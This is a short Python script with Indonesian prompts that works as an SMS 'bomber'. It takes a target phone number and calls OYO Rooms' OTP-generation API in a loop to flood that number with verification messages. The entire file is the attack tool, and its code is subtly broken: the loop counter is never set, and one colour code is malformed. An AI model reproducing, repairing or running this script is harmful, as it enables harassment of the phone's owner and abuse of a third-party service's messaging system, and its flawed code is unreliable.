import requests, os

no=input("\033[0m[\033[1;32m+\033[0m] \033[1;77mMasukan No Target: \033[0m")
while True:
        idk=('status')
        r=requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+no+'&country_code=+62')
        if str(idk) in str(r.text):
                print("\033[0m[\033[1;34#m+\033[0m] \033[1;77mBerhasil")
        else:
                print("\033[0m[\033[1;31m!\033[0m] \033[1;77mGagal")
                break
        i+=1
        if i == 20:
                print("\033[0m[\033[1;33m-\033[0m] \033[1;77mSpam terbatas")
                break
